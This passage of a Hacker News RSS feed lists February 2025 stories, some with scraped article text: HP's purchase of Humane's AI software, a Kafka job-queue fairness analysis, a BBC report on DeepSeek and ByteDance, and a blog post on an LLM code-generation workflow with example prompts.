            <pubDate>Wed, 19 Feb 2025 00:18:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.meta.com/blog/connect-2025-llamacon-save-the-date/">https://www.meta.com/blog/connect-2025-llamacon-save-the-date/</a>, See on <a href="https://news.ycombinator.com/item?id=43096922">Hacker News</a></p>
Couldn't get https://www.meta.com/blog/connect-2025-llamacon-save-the-date/: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[Alice Hamilton waged a one-woman campaign to get the lead out of everything (346 pts)]]></title>
            <link>https://www.smithsonianmag.com/innovation/how-alice-hamilton-waged-one-woman-campaign-get-lead-out-everything-180985960/</link>
            <guid>43096422</guid>
            <pubDate>Tue, 18 Feb 2025 23:22:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.smithsonianmag.com/innovation/how-alice-hamilton-waged-one-woman-campaign-get-lead-out-everything-180985960/">https://www.smithsonianmag.com/innovation/how-alice-hamilton-waged-one-woman-campaign-get-lead-out-everything-180985960/</a>, See on <a href="https://news.ycombinator.com/item?id=43096422">Hacker News</a></p>
Couldn't get https://www.smithsonianmag.com/innovation/how-alice-hamilton-waged-one-woman-campaign-get-lead-out-everything-180985960/: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[HP Acquires Humane's AI Software (213 pts)]]></title>
            <link>https://humane.com/media/humane-hp</link>
            <guid>43095811</guid>
            <pubDate>Tue, 18 Feb 2025 22:15:05 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://humane.com/media/humane-hp">https://humane.com/media/humane-hp</a>, See on <a href="https://news.ycombinator.com/item?id=43095811">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-oldscrollwrapper="true"><p><strong>Palo Alto, CA, February 18, 2025</strong> – HP Inc. (NYSE: HPQ) announced a definitive agreement to acquire key AI capabilities from Humane, including their AI-powered platform Cosmos, highly skilled technical talent, and intellectual property with more than 300 patents and patent applications. The acquisition advances HP’s transformation into a more experience-led company.</p><p>"This investment will rapidly accelerate our ability to develop a new generation of devices that seamlessly orchestrate AI requests both locally and in the cloud," said Tuan Tran, President of Technology and Innovation at HP. "Humane’s AI platform Cosmos, backed by an incredible group of engineers, will help us create an intelligent ecosystem across all HP devices from AI PCs to smart printers and connected conference rooms. This will unlock new levels of functionality for our customers and deliver on the promises of AI."</p><p>The acquisition brings a highly skilled group of Humane engineers, architects, and product innovators to HP’s Technology and Innovation Organization. They will form HP IQ, HP’s new AI innovation lab focused on building an intelligent ecosystem across HP’s products and services for the future of work.</p><p>“We’re excited to join HP at such a pivotal moment in the industry and help shape the future of intelligent experiences,” said Bethany Bongiorno and Imran Chaudhri, Co-founders of Humane. “HP’s scale, global reach, and operational excellence—combined with our design-led approach, integration technology, and engineering expertise—will redefine workforce productivity.”</p><p>HP is committed to reinventing the future of work through technology, delivering experiences that empower organizations and employees to thrive in today's dynamic environment.</p><p>The $116 million transaction is expected to close at the end of this month.&nbsp;</p><p><strong>About HP&nbsp;</strong></p><p>HP Inc. (NYSE: HPQ) is a global technology leader and creator of solutions that enable people to bring their ideas to life and connect to the things that matter most. Operating in more than 170 countries, HP delivers a wide range of innovative and sustainable devices, services and subscriptions for personal computing, printing, 3D printing, hybrid work, gaming, and more. For more information, please visit: <a href="http://www.hp.com/" target="_blank" rel="noreferrer"><strong>http://www.hp.com</strong></a>.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A year of uv: pros, cons, and should you migrate (640 pts)]]></title>
            <link>https://www.bitecode.dev/p/a-year-of-uv-pros-cons-and-should</link>
            <guid>43095157</guid>
            <pubDate>Tue, 18 Feb 2025 21:09:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.bitecode.dev/p/a-year-of-uv-pros-cons-and-should">https://www.bitecode.dev/p/a-year-of-uv-pros-cons-and-should</a>, See on <a href="https://news.ycombinator.com/item?id=43095157">Hacker News</a></p>
Couldn't get https://www.bitecode.dev/p/a-year-of-uv-pros-cons-and-should: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[Kafka at the low end: how bad can it get? (112 pts)]]></title>
            <link>https://broot.ca/kafka-at-the-low-end.html</link>
            <guid>43095070</guid>
            <pubDate>Tue, 18 Feb 2025 21:01:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://broot.ca/kafka-at-the-low-end.html">https://broot.ca/kafka-at-the-low-end.html</a>, See on <a href="https://news.ycombinator.com/item?id=43095070">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p>There is oft-quoted advice that Kafka does poorly as a job queue. I’ve experienced
this myself, and I wanted to formalize it a bit.</p>

<p>I’ll use the common architecture of a Web application submitting
background jobs to workers via Kafka (for example, to generate a PDF of some
report).  Except for the use of Kafka in this role, this is common in Web
applications, and (speaking from experience!) when Kafka is already deployed,
there is an impulse to use it instead of deploying yet-another queue system.</p>

<p>Note: when <a href="https://www.confluent.io/blog/queues-on-kafka/">Queues for Kafka (KIP-932)</a> becomes
a thing, a lot of these concerns go away. I look forward to it!</p>

<p>What I want to characterize here is the worst-case “unfairness” of jobs being
assigned to workers. There are many other reasons to not use Kafka as a job
queue, but this unfairness is (in my view) the strongest reason. In most
queues, you put work into the queue and every worker… well, <em>works</em> until all
the work is done. It sound obvious, but that’s the raison d’être for these
things! When (mis-)using Kafka as a queue, this is not the case: work can get
unfairly assigned to one worker, even if other workers have nothing to do. So,
how many jobs can <em>one</em> worker be assigned, before <em>any other</em> worker is
given work? This can be worked out with this formula:</p>

<div><pre><code>WorstCaseJobsPerConsumer = (Partitions / Consumers) * Producers
</code></pre></div>

<p>To work an example, say you have a topic with 16 partitions, because you would like to
be able to scale up to 16 consumers at peak times, but, at your current load you only
predict you need 4 consumers processing jobs. Further, say you have 5 producers
(Web application servers, here - Gunicorn processes, Kubernetes pods, whatever)
that receive an API call and put a job onto this Kafka topic. Imagine these Web
workers are behind a load balancer which routes API calls in a round-robin
fashion to each of those 5 Web workers. Pretty typical architecture right?</p>

<p><img src="https://broot.ca/img/kafka.png"></p>

<p>Plugging these numbers in, we get <code>(16 / 4) * 5 == 20</code>: that means, if you’re unlucky, the
next <em>20 jobs</em> coming along could <em>all</em> be routed to a single consumer, and that
consumer has to churn away at those 20 jobs while its 3 counterparts will sit idle. How this would
happen is by the following somewhat unlucky sequence of events:</p>

<ul>
  <li>Before any API calls are made, the 4 worker processes start up, and each take 4 of the 16 topic’s partitions, so that
the partitions are fairly shared.</li>
  <li>20 API calls are made by clients.</li>
  <li>The load balancer round-robins these 20 requests, giving 4 requests each to the 5 Web workers</li>
  <li>Each of these Web workers puts those 4 records onto 4 of the topic’s partitions in a round-robin fashion. And, because they
do not coordinate this, they might choose the same 4 partitions, which happen to all land on a single consumer.</li>
</ul>

<p>This exact sequence of events is rare, but milder variations of this happen
constantly when Kafka is used this way, at a low volume - such as only half, or
three-quarters of your workers being busy, while the remainder are idle <em>and
there’s work queued, just sitting there</em>.</p>

<p>To decide if this matters to your application, think about your peak periods
and how many jobs might be created in that period, and what the latency
expectations are for those jobs. If it’s a small internal application used by,
say, 15 users, and they all (in the same instant) request 1 job that takes 5
minutes to run, then those 15 jobs can land on the same consumer and the queue
takes 75 minutes to clear, leading to some of those users being very unhappy.
This doesn’t <em>always</em> happen, but it <em>can</em>.
On the other hand, if you have 200 users each requesting 1 job and those jobs
take 1 second to run, these 200 jobs will be much more fairly distributed and
all workers will be contributing to clearing that queue.  So where, exactly, is
this cutoff? As a rule of thumb, if you have <em>at least</em>
<code>WorstCaseJobsPerConsumer * Consumers</code> jobs in-flight in your peak period (in
the above example, this is <code>20 * 4 == 80 jobs</code>), then you can be sure that all
your workers are doing <em>some</em> work, because there are enough jobs to overcome
the aforementioned worst-case behaviour. If there are fewer jobs than this,
you run the risk that some workers will not be pulling their weight.</p>

<p>Please note that I’m completely ignoring varying job run times. That makes this
problem significantly worse, because again, work is assigned to workers on a
record-by-record basis, irrespective of how long those jobs take. A long job
will block a short job and there’s nothing you can do about it.</p>

<p>I am <em>not</em> trying to say Kafka is a bad tool - what I am saying is <em>it was not
designed for such a low volume</em>. It was designed for exactly the opposite
(millions or billions of records) where a conventional single-node message
broker <em>simply cannot keep up</em>. It strips away a lot of the <em>very useful</em>
features of these conventional brokers in order to go faster. If you don’t
<em>need</em> that speed, you are losing a lot in that trade-off!</p>

<p>In conclusion: the oft-quoted wisdom is right; Kafka is not a good job queue,
especially not at particularly low volumes, at least until <a href="https://www.confluent.io/blog/queues-on-kafka/">Queues for Kafka
(KIP-932)</a> comes along.</p>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[South Korean regulator accuses DeepSeek of sharing user data with ByteDance (229 pts)]]></title>
            <link>https://www.bbc.com/news/articles/c4gex0x87g4o</link>
            <guid>43094651</guid>
            <pubDate>Tue, 18 Feb 2025 20:29:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.bbc.com/news/articles/c4gex0x87g4o">https://www.bbc.com/news/articles/c4gex0x87g4o</a>, See on <a href="https://news.ycombinator.com/item?id=43094651">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-component="text-block"><p>South Korea has accused Chinese AI startup DeepSeek of sharing user data with the owner of TikTok in China.<!-- --></p><p>"We confirmed DeepSeek communicating with ByteDance," the South Korean data protection regulator told <!-- --><a target="_blank" href="https://en.yna.co.kr/view/AEN20250218005300315">Yonhap News Agency.<!-- --></a></p><p>The country had already <!-- --><a target="_self" href="https://www.bbc.co.uk/news/articles/clyzym0vn8go">removed DeepSeek from app stores<!-- --></a> over the weekend over data protection concerns.<!-- --></p><p>The Chinese app <!-- --><a target="_self" href="https://www.bbc.co.uk/news/articles/c5yv5976z9po">caused shockwaves<!-- --></a> in the AI world in January, wiping billions off global stock markets over claims its new model was trained at a much lower cost than US rivals such as ChatGPT.<!-- --></p></div><div data-component="text-block"><p>Since then, multiple countries have warned that user data may not be properly protected, and in February a US cybersecurity company <!-- --><a target="_blank" href="https://securityscorecard.com/blog/a-deep-peek-at-deepseek/#bytedance-code-implications:~:text=ByteDance%20Code%20Implications">alleged potential data sharing<!-- --></a> between DeepSeek and ByteDance.<!-- --></p><p>DeepSeek's apparent overnight impact saw it shoot to the top of App Store charts in the UK, US and many other countries around the world - although it now sits far below ChatGPT in UK rankings.<!-- --></p><p>In South Korea, it had been downloaded over a million times before being pulled from Apple and Google's App Stores on Saturday evening. <!-- --></p><p>Existing users can still access the app and use it on a web browser.<!-- --></p><p>The data regulator, the Personal Information Protection Commission (PIPC), told South Korea's Yonhap News Agency that despite finding a link between DeepSeek and ByteDance, it was "yet to confirm what data was transferred and to what extent".<!-- --></p><p>Critics of the Chinese state have long argued its National Intelligence Law <!-- --><a target="_self" href="https://www.bbc.co.uk/news/technology-65019279">allows the government<!-- --></a> to access any data it wants from Chinese companies.<!-- --></p><p>However, ByteDance, headquartered in Beijing, is owned by a number of global investors - <!-- --><a target="_self" href="https://www.bbc.co.uk/news/technology-64797355#:~:text=Article%20seven%20of%20China's%20National,TikTok%2C%20but%20all%20Chinese%20companies.&amp;text=Why%20does%20the%20US%20want%20to%20ban%20TikTok%3F">and others say<!-- --></a> the same law allows for the protection of private companies and personal data.<!-- --></p><p>Fears over user data being sent to China was one of the reasons the US Supreme Court upheld a ban on TikTok, which is owned by ByteDance. <!-- --></p><p>The US ban is <!-- --><a target="_self" href="https://www.bbc.co.uk/news/articles/c4g91kyjw07o">on hold until 5 April<!-- --></a> as President Donald Trump attempts to broker a resolution.<!-- --></p></div><div data-component="text-block"><p>Cybersecurity company Security Scorecard <!-- --><a target="_blank" href="https://securityscorecard.com/blog/a-deep-peek-at-deepseek/">published a blog<!-- --></a> on DeepSeek on 10 February which suggested "multiple direct references to ByteDance-owned" services.<!-- --></p><p>"These references suggest deep integration with ByteDance's analytics and performance monitoring infrastructure," it said in its review of DeepSeek's Android app.<!-- --></p><p>Security Scorecard expressed concern that along with privacy risks, DeepSeek "user behaviour and device metadata [are] likely sent to ByteDance servers".<!-- --></p><p>It also found data "being transmitted to domains linked to Chinese state-owned entities".<!-- --></p><p>On Monday, <!-- --><a target="_blank" href="https://www.pipc.go.kr/eng/user/ltn/new/noticeDetail.do">South Korea's PIPC said<!-- --></a> it "found out traffic generated by third-party data transfers and insufficient transparency in DeepSeek's privacy policy".<!-- --></p><p>It said DeepSeek was cooperating with the regulator, and acknowledged it had failed to to take into account South Korean privacy laws.<!-- --></p><p>But the regulator advised users "exercise caution and avoid entering personal information into the chatbot".<!-- --></p><p>South Korea has already followed a number of countries such as Australia and Taiwan in banning DeepSeek from government devices. <!-- --></p><p>The BBC has contacted the PIPC, ByteDance and DeepSeek's parent company, High Flyer, for a response.<!-- --></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[AWS paywalling select knowledge base articles, requiring Premium Support plan (189 pts)]]></title>
            <link>https://repost.aws/knowledge-center/eks-api-server-unauthorized-error</link>
            <guid>43094467</guid>
            <pubDate>Tue, 18 Feb 2025 20:15:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://repost.aws/knowledge-center/eks-api-server-unauthorized-error">https://repost.aws/knowledge-center/eks-api-server-unauthorized-error</a>, See on <a href="https://news.ycombinator.com/item?id=43094467">Hacker News</a></p>
Couldn't get https://repost.aws/knowledge-center/eks-api-server-unauthorized-error: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Valve releases Team Fortress 2 game code (1692 pts)]]></title>
            <link>https://github.com/ValveSoftware/source-sdk-2013/commit/0759e2e8e179d5352d81d0d4aaded72c1704b7a9</link>
            <guid>43094260</guid>
            <pubDate>Tue, 18 Feb 2025 19:57:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/ValveSoftware/source-sdk-2013/commit/0759e2e8e179d5352d81d0d4aaded72c1704b7a9">https://github.com/ValveSoftware/source-sdk-2013/commit/0759e2e8e179d5352d81d0d4aaded72c1704b7a9</a>, See on <a href="https://news.ycombinator.com/item?id=43094260">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemscope="" itemtype="http://schema.org/SoftwareSourceCode" data-commit-hovercards-enabled="" data-discussion-hovercards-enabled="" data-issue-and-pr-hovercards-enabled="" data-project-hovercards-enabled="">
    <main id="js-repo-pjax-container">
      
  

    
    

    






  
  

  



<turbo-frame id="repo-content-turbo-frame" target="_top" data-turbo-action="advance">
    <div id="repo-content-pjax-container">
  <p>
  <h2>Commit</h2>
</p>

<p><a href="https://github.com/ValveSoftware/source-sdk-2013/commit/0759e2e8e179d5352d81d0d4aaded72c1704b7a9" data-hotkey="y">Permalink</a></p>


<div>
  <div>
    

    <p><a id="browse-at-time-link" href="https://github.com/ValveSoftware/source-sdk-2013/tree/0759e2e8e179d5352d81d0d4aaded72c1704b7a9" rel="nofollow">Browse files</a></p><tool-tip id="tooltip-068139a0-98a5-40d9-a6e4-e3e722c5cd8a" for="browse-at-time-link" popover="manual" data-direction="ne" data-type="description" data-view-component="true">Browse the repository at this point in the history</tool-tip>
  </div>


  <div>
  <include-fragment src="/ValveSoftware/source-sdk-2013/branch_commits/0759e2e8e179d5352d81d0d4aaded72c1704b7a9" id="async-branches-list">
    <div>
      
      <ul>
        <li>Loading branch information<span></span></li>
      </ul>
    </div>
</include-fragment></div>


  
</div>


  


  <diff-layout>
    
        </diff-layout>


</div>

</turbo-frame>


    </main>
  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[My LLM codegen workflow (445 pts)]]></title>
            <link>https://harper.blog/2025/02/16/my-llm-codegen-workflow-atm/</link>
            <guid>43094006</guid>
            <pubDate>Tue, 18 Feb 2025 19:33:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://harper.blog/2025/02/16/my-llm-codegen-workflow-atm/">https://harper.blog/2025/02/16/my-llm-codegen-workflow-atm/</a>, See on <a href="https://news.ycombinator.com/item?id=43094006">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><em>tl:dr; Brainstorm spec, then plan a plan, then execute using LLM codegen. Discrete loops. Then magic. ✩₊˚.⋆☾⋆⁺₊✧</em></p><p>I have been building so many small products using LLMs. It has been fun, and useful. However, there are pitfalls that can waste so much time. A while back a friend asked me how I was using LLMs to write software. I thought “oh boy. how much time do you have!” and thus this post.</p><p>(p.s. if you are an AI hater - scroll to the end)</p><p>I talk to many dev friends about this, and we all have a similar approach with various tweaks in either direction.</p><p>Here is my workflow. It is built upon my own work, conversations with friends (thx <a href="https://www.nikete.com/">Nikete</a>, <a href="https://nocruft.com/">Kanno</a>, <a href="https://fsck.com/">Obra</a>, <a href="https://github.com/KristopherKubicki">Kris</a>, and <a href="https://thinks.lol/">Erik</a>), and following many best practices shared on the various terrible internet <a href="https://news.ycombinator.com/">bad</a> <a href="https://twitter.com/">places</a>.</p><p>This is working well <strong>NOW</strong>, it will probably not work in 2 weeks, or it will work twice as well. ¯\_(ツ)_/¯</p><h2 id="lets-go">Let’s go</h2><figure role="group" aria-describedby="caption-I always find these AI-generated images to be suspect. Say hi to my juggalo coding robot angel!"><img title="" loading="lazy" decoding="async" src="https://harper.blog/images/posts/llm-coding-robot.webp" alt="Juggalo Robot" width="" height=""><figcaption id="caption-I always find these AI-generated images to be suspect. Say hi to my juggalo coding robot angel!">I always find these AI-generated images to be suspect. Say hi to my juggalo coding robot angel!</figcaption></figure><p>There are many paths for doing dev, but my case is typically one of two:</p><ul><li>Greenfield code</li><li>Legacy modern code</li></ul><p>I will show you my process for both paths</p><h2 id="greenfield">Greenfield</h2><p>I find the following process works well for greenfield development. It provides a robust planning and documentation approach, and allows you to execute easily in small steps.</p><figure role="group" aria-describedby="caption-Technically, there is a green field on the right. Leica Q, 5/14/2016"><img title="" loading="lazy" decoding="async" src="https://harper.blog/images/posts/greenfield.jpg" alt="Green field" width="" height=""><figcaption id="caption-Technically, there is a green field on the right. Leica Q, 5/14/2016">Technically, there is a green field on the right. Leica Q, 5/14/2016</figcaption></figure><h3 id="step-1-idea-honing">Step 1: Idea honing</h3><p>Use a conversational LLM to hone in on an idea (I use ChatGPT 4o / o3 for this):</p><pre tabindex="0"><code data-lang="prompt">Ask me one question at a time so we can develop a thorough, step-by-step spec for this idea. Each question should build on my previous answers, and our end goal is to have a detailed specification I can hand off to a developer. Let’s do this iteratively and dig into every relevant detail. Remember, only one question at a time.

Here’s the idea:

&lt;IDEA&gt;</code></pre><p>At the end of the brainstorm (it will come to a natural conclusion):</p><pre tabindex="0"><code data-lang="prompt">Now that we’ve wrapped up the brainstorming process, can you compile our findings into a comprehensive, developer-ready specification? Include all relevant requirements, architecture choices, data handling details, error handling strategies, and a testing plan so a developer can immediately begin implementation.</code></pre><p>This will output a pretty solid and straightforward spec that can be handed off to the planning step. I like to save it as <code>spec.md</code> in the repo.</p><blockquote><p>You can use this spec for a number of things. We are doing codegen here, but I have used it to bolster ideas by asking a reasoning model to poke holes in the idea (must go deeper!), to generate a white paper, or to generate a business model. You can pop it into deep research and get a 10k word supporting document in return.</p></blockquote><h3 id="step-2-planning">Step 2: Planning</h3><p>Take the spec and pass it to a proper reasoning model (<code>o1*</code>, <code>o3*</code>, <code>r1</code>):</p><p>(This is the TDD prompt)</p><pre tabindex="0"><code data-lang="prompt">Draft a detailed, step-by-step blueprint for building this project. Then, once you have a solid plan, break it down into small, iterative chunks that build on each other. Look at these chunks and then go another round to break it into small steps. Review the results and make sure that the steps are small enough to be implemented safely with strong testing, but big enough to move the project forward. Iterate until you feel that the steps are right sized for this project.

From here you should have the foundation to provide a series of prompts for a code-generation LLM that will implement each step in a test-driven manner. Prioritize best practices, incremental progress, and early testing, ensuring no big jumps in complexity at any stage. Make sure that each prompt builds on the previous prompts, and ends with wiring things together. There should be no hanging or orphaned code that isn't integrated into a previous step.

Make sure and separate each prompt section. Use markdown. Each prompt should be tagged as text using code tags. The goal is to output prompts, but context, etc is important as well.

&lt;SPEC&gt;</code></pre><p>(This is the non-tdd prompt)</p><pre tabindex="0"><code data-lang="prompt">Draft a detailed, step-by-step blueprint for building this project. Then, once you have a solid plan, break it down into small, iterative chunks that build on each other. Look at these chunks and then go another round to break it into small steps. review the results and make sure that the steps are small enough to be implemented safely, but big enough to move the project forward. Iterate until you feel that the steps are right sized for this project.

From here you should have the foundation to provide a series of prompts for a code-generation LLM that will implement each step. Prioritize best practices, and incremental progress, ensuring no big jumps in complexity at any stage. Make sure that each prompt builds on the previous prompts, and ends with wiring things together. There should be no hanging or orphaned code that isn't integrated into a previous step.

Make sure and separate each prompt section. Use markdown. Each prompt should be tagged as text using code tags. The goal is to output prompts, but context, etc is important as well.

&lt;SPEC&gt;</code></pre><p>It should output a prompt plan that you can execute with aider, cursor, etc. I like to save this as <code>prompt_plan.md</code> in the repo.</p><p>I then have it output a <code>todo.md</code> that can be checked off.</p><pre tabindex="0"><code data-lang="prompt">Can you make a `todo.md` that I can use as a checklist? Be thorough.</code></pre><p>You can save it as <code>todo.md</code> in the repo.</p><p>Your codegen tool should be able to check off the <code>todo.md</code> while processing. This is good for keeping state across sessions.</p><h4 id="yay-plan">Yay. Plan!</h4><p>Now you have a robust plan and documentation that will help you execute and build your project.</p><p>This entire process will take maybe <strong>15 minutes</strong>. It is pretty quick. Wild tbh.</p><h3 id="step-3-execution">Step 3: Execution</h3><p>There are so many options available for execution. The success really depends on how well step 2 went.</p><p>I have used this workflow with <a href="https://githubnext.com/projects/copilot-workspace">github workspace</a>, <a href="https://aider.chat/">aider</a>, <a href="https://www.cursor.com/">cursor</a>, <a href="https://github.com/Doriandarko/claude-engineer">claude engineer</a>, <a href="https://sweep.dev/">sweep.dev</a>, <a href="https://chatgpt.com/">chatgpt</a>, <a href="https://claude.ai/">claude.ai</a>, etc. It works pretty well with all the tools I have tried, and I imagine it will work well with any codegen tool.</p><p>I, however, prefer <strong>raw</strong> claude and aider:</p><h3 id="claude">Claude</h3><p>I essentially pair program with <a href="https://claude.ai/">claude.ai</a> and just drop each prompt in iteratively. I find that works pretty well. The back and forth can be annoying, but it largely works.</p><p>I am in charge of the initial boilerplate code, and making sure tooling is set up correctly. This allows for some freedom, choice, and guidance in the beginning. Claude has a tendency to just output react code - and having a solid foundation with the language, style, and tooling of your choice will help quite a bit.</p><p>I will then use a tool like <a href="https://github.com/yamadashy/repomix">repomix</a> to iterate when things get stuck (more about that later).</p><p>The workflow is like this:</p><ul><li>set up the repo (boilerplate, uv init, cargo init, etc)</li><li>paste in prompt into claude</li><li>copy and paste code from claude.ai into IDE</li><li>run code, run tests, etc</li><li>…</li><li>if it works, move on to next prompt</li><li>if it doesn’t work, use repomix to pass the codebase to claude to debug</li><li>rinse repeat ✩₊˚.⋆☾⋆⁺₊✧</li></ul><h3 id="aider">Aider</h3><p><a href="https://aider.chat/">Aider</a> is fun and weird to use. I find that it slots in well to the output of step 2. I can get really far with very little work.</p><p>The workflow is essentially the same as above but instead of pasting into claude, I am pasting the prompts into aider.</p><p>Aider will then “just do it” and I get to play <a href="https://orteil.dashnet.org/cookieclicker/">cookie clicker</a>.</p><blockquote><p>An aside: Aider does really great benchmarking of new models for codegen in their <a href="https://aider.chat/docs/leaderboards/">LLM leaderboards</a>. I find it to be a really great resource for seeing how effective new models are.</p></blockquote><p>Testing is nice with aider, because it can be even more hands off as aider will run the test suite and debug things for you.</p><p>The workflow is like this:</p><ul><li>set up the repo (boilerplate, uv init, cargo init, etc)</li><li>start aider</li><li>paste prompt into aider</li><li>watch aider dance ♪┏(・o･)┛♪</li><li>aider will run tests, or you can run app to verify</li><li>if it works, move on to next prompt</li><li>if it doesn’t work, Q&amp;A with aider to fix</li><li>rinse repeat ✩₊˚.⋆☾⋆⁺₊✧</li></ul><h3 id="results">Results</h3><p>I have built so so many things using this workflow: scripts, expo apps, rust cli tools, etc. It has worked across programming languages, and contexts. I do like it.</p><p>If you have a small or large project that you are procrastinating on, I would recommend giving it a shot. You will be surprised how far you can get in a short amount of time.</p><p>My hack to-do list is empty because I built everything. I keep thinking of new things and knocking them out while watching a movie or something. For the first time in years, I am spending time with new programming languages and tools. This is pushing me to expand my programming perspective.</p><h2 id="non-greenfield-iteration-incrementally">Non-greenfield: Iteration, incrementally</h2><p>Sometimes you don’t have greenfield, and instead need to iterate or do increment work on an established code base.</p><figure role="group" aria-describedby="caption-This is not a green field. A random photo from my grandfather’s camera - somewhere in Uganda in the 60s"><img title="" loading="lazy" decoding="async" src="https://harper.blog/images/posts/brownfield.jpg" alt="a brown field" width="" height=""><figcaption id="caption-This is not a green field. A random photo from my grandfather’s camera - somewhere in Uganda in the 60s">This is not a green field. A random photo from my grandfather’s camera - somewhere in Uganda in the 60s</figcaption></figure><p>For this I have a slightly different method. It is similar to above, but a bit less “planning based.” The planning is done per task, not for the entire project.</p><h3 id="get-context">Get context</h3><p>I think everyone who is knee-deep in AI dev has a different tool for this, but you need something to grab your source code and efficiently jam it into the LLM.</p><p>I currently use a tool called <a href="https://github.com/yamadashy/repomix">repomix</a>. I have a task collection defined in my global <code>~/.config/mise/config.toml</code> that allows me to do various things with my code base (<a href="https://mise.jdx.dev/">mise rules</a>).</p><p>Here is the LLM task list:</p><div><pre tabindex="0"><code data-lang="shell"><span><span>LLM:clean_bundles           Generate LLM bundle output file using repomix
</span></span><span><span>LLM:copy_buffer_bundle      Copy generated LLM bundle from output.txt to system clipboard <span>for</span> external use
</span></span><span><span>LLM:generate_code_review    Generate code review output from repository content stored in output.txt using LLM generation
</span></span><span><span>LLM:generate_github_issues  Generate GitHub issues from repository content stored in output.txt using LLM generation
</span></span><span><span>LLM:generate_issue_prompts  Generate issue prompts from repository content stored in output.txt using LLM generation
</span></span><span><span>LLM:generate_missing_tests  Generate missing tests <span>for</span> code in repository content stored in output.txt using LLM generation
</span></span><span><span>LLM:generate_readme         Generate README.md from repository content stored in output.txt using LLM generation</span></span></code></pre></div><p>I generate an <code>output.txt</code> that has the context from my code base. If I am blowing through tokens, and it is too big - I will edit the generate command to ignore parts of the code base that are not germane to this task.</p><blockquote><p>One thing really nice about <code>mise</code> is that the tasks can be redefined and overloaded in the working directory’s <code>.mise.toml</code>. I can use a different tool to dump/pack the code, and as long as it generates an <code>output.txt</code> I can use my LLM tasks. This is helpful when various codebases differ so much. I regularly override the <code>repomix</code> step to include broader ignore patterns, or just use a more effective tool to do the packing.</p></blockquote><p>Once the output.txt is generated, I pass it to the <a href="https://github.com/simonw/LLM">LLM</a> command to do various transformations and then save those as a markdown file.</p><p>Ultimately, the mise task is running this: <code>cat output.txt | LLM -t readme-gen &gt; README.md</code> or <code>cat output.txt | LLM -m claude-3.5-sonnet -t code-review-gen &gt; code-review.md</code>. This isn’t super complicated. the <code>LLM</code> command is doing the heavy lifting (supporting different models, saving keys, and using prompt templates).</p><p>For example, if I need a quick review and fix of test coverage I would do the following:</p><h4 id="claude-1">Claude</h4><ul><li>go to the directory where the code lives</li><li>run <code>mise run LLM:generate_missing_tests</code></li><li>look at the generated markdown file (<code>issue-prompts.md</code>)</li><li>grab the full context for the code: <code>mise run LLM:copy_buffer_bundle</code></li><li>paste that into claude along with the first missing test “issue”</li><li>copy the generated code from claude into my ide.</li><li>…</li><li>run tests</li><li>rinse repeat ✩₊˚.⋆☾⋆⁺₊✧</li></ul><h4 id="aider-1">Aider</h4><ul><li>go to the directory where the code lives</li><li>run aider (always make sure you are on a new branch for aider work)</li><li>run <code>mise run LLM:generate_missing_tests</code></li><li>look at the generated markdown file (<code>issue-prompts.md</code>)</li><li>paste the first missing test “issue” into aider</li><li>watch aider dance ♪┏(・o･)┛♪</li><li>…</li><li>run tests</li><li>rinse repeat ✩₊˚.⋆☾⋆⁺₊✧</li></ul><p>This is a pretty good way to incrementally improve a code base. It has been super helpful to do small amounts of work in a big code base. I have found that I can do any sized tasks with this method.</p><h3 id="prompt-magic">Prompt magic</h3><p>These quick hacks work super well to dig into places where we can make a project more robust. It is super quick, and effective.</p><p>Here are some of my prompts that I use to dig into established code bases:</p><h4 id="code-review">Code review</h4><pre tabindex="0"><code data-lang="prompt">You are a senior developer. Your job is to do a thorough code review of this code. You should write it up and output markdown. Include line numbers, and contextual info. Your code review will be passed to another teammate, so be thorough. Think deeply  before writing the code review. Review every part, and don't hallucinate.</code></pre><h4 id="github-issue-generation">GitHub Issue generation</h4><p>(I need to automate the actual issue posting!)</p><pre tabindex="0"><code data-lang="prompt">You are a senior developer. Your job is to review this code, and write out the top issues that you see with the code. It could be bugs, design choices, or code cleanliness issues. You should be specific, and be very good. Do Not Hallucinate. Think quietly to yourself, then act - write the issues. The issues will be given to a developer to executed on, so they should be in a format that is compatible with github issues</code></pre><h4 id="missing-tests">Missing tests</h4><pre tabindex="0"><code data-lang="prompt">You are a senior developer. Your job is to review this code, and write out a list of missing test cases, and code tests that should exist. You should be specific, and be very good. Do Not Hallucinate. Think quietly to yourself, then act - write the issues. The issues  will be given to a developer to executed on, so they should be in a format that is compatible with github issues</code></pre><p>These prompts are pretty <em>old and busted</em> (“boomer prompts” if I may). They need some refactoring. If you have ideas to make them better lmk.</p><h2 id="skiing-ᨒ-𖠰ᨒ-𖠰">Skiing ᨒ↟ 𖠰ᨒ↟ 𖠰</h2><p>When I describe this process to people I say “you have to aggressively keep track of what’s going on because you can easily get ahead of yourself.”</p><p>For some reason I say “over my skies” a lot when talking about LLMs. I don’t know why. It resonates with me. Maybe it’s because it is beautiful smooth powder skiing, and then all of a sudden you are like “WHAT THE FUCK IS GOING ON!,” and are completely lost and suddenly fall off a cliff.</p><p>I find that using a <strong>planning step</strong> (ala the Greenfield process above) can help keep things under control. At least you will have a doc you can double-check against. I also do believe that testing is helpful - especially if you are doing wild style aider coding. Helps keep things good, and tight.</p><p>Regardless, I still do find myself <strong>over my skies</strong> quite 